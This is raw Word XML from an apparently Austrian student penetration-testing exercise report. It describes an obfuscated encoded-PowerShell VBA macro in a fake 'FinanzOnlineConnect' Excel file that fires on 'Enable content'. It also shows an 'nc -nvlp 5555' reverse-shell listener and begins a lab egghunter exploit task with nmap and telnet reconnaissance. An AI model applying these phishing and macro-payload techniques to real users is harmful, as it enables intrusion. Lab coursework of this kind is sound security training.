      </w:r>
      <w:r w:rsidR="00023C8D" w:rsidRPr="00023C8D">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>endoded ihn mit d</w:t>
      </w:r>
      <w:r w:rsidR="00023C8D">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>em Skript. Ergebnis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E726BC3" w14:textId="469CE637" w:rsidR="00023C8D" w:rsidRDefault="00023C8D" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00023C8D" w14:paraId="1CDC28E7" w14:textId="77777777" w:rsidTr="00023C8D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69EF4FFA" w14:textId="0C3A423C" w:rsidR="00023C8D" w:rsidRDefault="00023C8D" w:rsidP="0084189E">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">Powershell -enc </w:t>
            </w:r>
            <w:r w:rsidRPr="00023C8D">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>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</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009E1FA2" w14:paraId="49C6B1DB" w14:textId="77777777" w:rsidTr="00023C8D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7644D5B0" w14:textId="49B2F50B" w:rsidR="009E1FA2" w:rsidRDefault="00A33124" w:rsidP="009E1FA2">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ergebnis von </w:t>
            </w:r>
            <w:r w:rsidR="009E1FA2" w:rsidRPr="00204E34">
              <w:t>encoding_2.ps1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A3EA8E3" w14:textId="2B378862" w:rsidR="008E3B7E" w:rsidRDefault="008E3B7E" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C77E634" w14:textId="0BEF3D34" w:rsidR="00CA28FA" w:rsidRDefault="00CA28FA" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="007A7192">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>er encodete Befehl wurde anschließend in das VBA Skript eingefügt und wieder obfuskiert.</w:t>
      </w:r>
      <w:r w:rsidR="00BA055B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Funktion wird mit </w:t>
      </w:r>
      <w:r w:rsidR="00BA055B" w:rsidRPr="00BA055B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Workbook_Open</w:t>
      </w:r>
      <w:r w:rsidR="00BA055B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">() aufgerufen, sobald der </w:t>
      </w:r>
      <w:r w:rsidR="00562706">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Mitarbeiter auf „Enable content“ klickt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEDDF51" w14:textId="6E30E352" w:rsidR="00161480" w:rsidRDefault="00161480" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="648DBF57" w14:textId="0E0B7B3F" w:rsidR="007A75D6" w:rsidRDefault="006D6A77" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das obfuskierte Skript wurde in die Datei </w:t>
      </w:r>
      <w:r w:rsidRPr="006D6A77">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>FinanzOnlineConnect_obf1.xlsm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> eingefügt und auf einer zweiten Maschine getestet.</w:t>
      </w:r>
      <w:r w:rsidR="00CD4373">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D33645">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">In der Datei </w:t>
      </w:r>
      <w:r w:rsidR="00D33645" w:rsidRPr="00D33645">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>FinanzOnlineConnect_clear1.xlsm</w:t>
      </w:r>
      <w:r w:rsidR="00D33645">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ist das Modul im Klartext zu sehen. </w:t>
      </w:r>
      <w:r w:rsidR="00CD4373">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Wie in der Abbildung ersichtlich wurde auf der Kali VM mit „nc -nvlp 5555“ ein Listener eingerichtet.</w:t>
      </w:r>
      <w:r w:rsidR="00562706">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nach dem Klick auf „Enable Content“ konnte ich von meiner Kali Maschine auf das Zielsystem zugreifen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA4BBB2" w14:textId="77777777" w:rsidR="001F397E" w:rsidRDefault="001F397E" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BFAAECC" w14:textId="340CACB2" w:rsidR="00D7786E" w:rsidRDefault="00F84D96" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6549F65D" wp14:editId="67F97DD2">
            <wp:extent cx="5759450" cy="2489200"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="141" name="Grafik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59450" cy="2489200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7991A864" w14:textId="63F60DD2" w:rsidR="00D7786E" w:rsidRDefault="00D7786E" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="717D171D" w14:textId="5157EB67" w:rsidR="00D7786E" w:rsidRDefault="00D96F4C" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Einen kleinen Schönheitsfehler gibt es aber noch, </w:t>
      </w:r>
      <w:r w:rsidR="007461D8">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>bei der Firewall muss ncat.exe zugel</w:t>
      </w:r>
      <w:r w:rsidR="00F10467">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>assen werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A63866" w14:textId="7F7015E8" w:rsidR="00765D76" w:rsidRDefault="004B5EA3" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A7B8CA1" wp14:editId="64804257">
            <wp:extent cx="2805112" cy="1964111"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="140" name="Grafik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2815952" cy="1971701"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7322DA5F" w14:textId="6C0B8211" w:rsidR="00765D76" w:rsidRDefault="00765D76" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1089C46F" w14:textId="00807719" w:rsidR="00384CE9" w:rsidRDefault="00384CE9" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Getestet am </w:t>
      </w:r>
      <w:r w:rsidR="00E9677B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>29. Dezember 2020</w:t>
      </w:r>
      <w:r w:rsidR="00FB2492">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Windows 10 wurde </w:t>
      </w:r>
      <w:r w:rsidR="00F07864">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>von der offiziellen Microsoft Seite als Developer Version für Virtualbox heruntergeladen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B659C53" w14:textId="642AF65E" w:rsidR="00F07864" w:rsidRDefault="00F07864" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F3A4DC3" w14:textId="58E078EF" w:rsidR="00F07864" w:rsidRPr="00F07864" w:rsidRDefault="00F07864" w:rsidP="00F07864">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F07864">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB20ABF" w14:textId="4F1CC9CD" w:rsidR="00384CE9" w:rsidRDefault="00384CE9" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E769AE0" w14:textId="5935347F" w:rsidR="006F281B" w:rsidRPr="00B252BE" w:rsidRDefault="009D1FA5" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Updates wurden anschließend durchgeführt. </w:t>
      </w:r>
      <w:r w:rsidR="006F281B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Zusätzlich wurde </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Office 365 Version unseres Studentenkontos auf dem System installiert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A38995" w14:textId="3125FA3A" w:rsidR="00A039DC" w:rsidRPr="00B252BE" w:rsidRDefault="00A039DC" w:rsidP="0084189E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B252BE">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6010BE56" w14:textId="11EBAA10" w:rsidR="009006BD" w:rsidRPr="00B47CB9" w:rsidRDefault="009006BD" w:rsidP="00B17779">
      <w:pPr>
        <w:pStyle w:val="berschrift1"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc62994614"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Aufgabe 2 (2P)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="130529D9" w14:textId="77777777" w:rsidR="009006BD" w:rsidRPr="00B47CB9" w:rsidRDefault="009006BD" w:rsidP="009006BD">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc62994615"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Angabe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="2239F4C3" w14:textId="77777777" w:rsidR="00B17779" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17779" w:rsidP="00E9677B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Nachdem die Social Engineering Kampagne ein voller Erfolg war und es Ihrem Team gelungen ist Ncat.exe zur Ausführung zu bringen kam Ihr Kollege aus der Schulungs- und Weiterbildungsabteilung mit einer Bitte zu Ihnen. Dort wurde für ein externes Schulungs- und Ausbildungsprogramm eine Anwendung erstellt, die bewusst Vulnerabilities beinhaltet. Man ersucht Sie nun diese Anwendung zu testen und exploiten, um eine Einschätzung zu bekommen wie herausfordernd die Aufgabe für die Schulungsteilnehmer sei. Wichtig sei, erklärt man Ihnen, dass Sie, sofern Sie in der Lage sind die Anwendung zu hacken unbedingt dies mittels eines Egghunter Exploits machen sollen, egal ob es auch andere Lösungen gäbe, da die Schulung eben dieses Thema behandelt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246F97E3" w14:textId="77777777" w:rsidR="00B17779" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17779" w:rsidP="00E9677B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Auf Ihre Nachfrage, welche Schulungsrechner verwendet werden meinte der Kollege, es soll ja nicht zu anspruchsvoll sein also 32 Bit Rechner mit deaktivierter DEP und ASLR.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E7E33C" w14:textId="23CAD707" w:rsidR="00B17779" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17779" w:rsidP="00E9677B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Mit den Worten „endlich wieder ein Zero day“ machen Sie sich sogleich ans Werk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A7F864" w14:textId="77777777" w:rsidR="00B17779" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17779">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8A3A2E" w14:textId="77777777" w:rsidR="00B17779" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17779" w:rsidP="00B17779">
      <w:pPr>
        <w:pStyle w:val="berschrift2"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc62994616"/>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Lösung</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="3BABD62C" w14:textId="03AFCE1B" w:rsidR="00710DE0" w:rsidRPr="00B47CB9" w:rsidRDefault="00710DE0" w:rsidP="00E9677B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Auf dem Desktop des Users Martin wurde ein</w:t>
      </w:r>
      <w:r w:rsidR="0079524A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">e Textdatei </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit </w:t>
      </w:r>
      <w:r w:rsidR="0079524A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dem Inhalt ‚egghunter flag‘ platziert, damit überprüft werden kann, ob d</w:t>
      </w:r>
      <w:r w:rsidR="004E0361" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>as Zielsystem erfolgreich übernommen werden konnte.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150EF0D9" w14:textId="1D8CDF9A" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00E9677B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Die Anwendung Board_Release.exe wurde auf einem gepatchte</w:t>
      </w:r>
      <w:r w:rsidR="00E9677B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Windows 7 32 bit Betriebssystem gestartet. Daraufhin öffnete sich auf dem Terminal folgende Ansicht:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793A7EA2" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E9AB4D7" wp14:editId="20187546">
            <wp:extent cx="3571875" cy="1076325"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="104" name="Grafik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571875" cy="1076325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="541909D5" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F9B0951" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Aus der Ausgabe kann herausgelesen werden, dass die Anwendung auf eingehende TCP Verbindungen wartet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C15991" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6995F427" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Innerhalb des ersten Schritts galt es zu analysieren, um was es sich bei der Anwendung überhaupt handelt. Um offene Ports, Services und deren Version ermitteln zu können wurde nmap mit der Option -sV verwendet. Aus dem Scan kann herausgelesen werden, dass sich Port 4444 geöffnet hat und dieser vermeintlich von der Anwendung benutzt wird.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C46C43" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="627A15FD" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6557B7BF" wp14:editId="713118DD">
            <wp:extent cx="5759450" cy="2383155"/>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59450" cy="2383155"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AA67FA" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="246385DD" w14:textId="247057BF" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Daher wurde als nächstes per Telnet versucht eine Verbindung herzustellen. Dazu wurde die </w:t>
      </w:r>
      <w:r w:rsidR="006559E9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>IP-Adresse</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und der vermutete Port übergeben. Der Server antwortet mit einem „HELLO FROM SERVER!“.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191330ED" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0393C781" wp14:editId="57596505">
            <wp:extent cx="2400300" cy="1162050"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="108" name="Grafik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400300" cy="1162050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1048B793" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B8563C2" wp14:editId="6750D560">
            <wp:extent cx="3724275" cy="2000250"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="109" name="Grafik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724275" cy="2000250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B73876" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FFDF5F3" w14:textId="1364EA2D" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Anwendung bietet unterschiedliche Anwendungsmöglichkeiten. Zum einen können Nachrichten </w:t>
      </w:r>
      <w:r w:rsidR="00E64FBE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit der Übergabe</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> des Parameters ‚A‘ erstellt werden. Als Input </w:t>
      </w:r>
      <w:r w:rsidR="00AB5CA1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>müssen</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> hier der Name und die Message übergeben werden. Mit ‚L‘ können Nachrichten aufgelistet werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD13CCC" w14:textId="77777777" w:rsidR="00EF0BD5" w:rsidRPr="00B47CB9" w:rsidRDefault="00EF0BD5" w:rsidP="00EF0BD5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
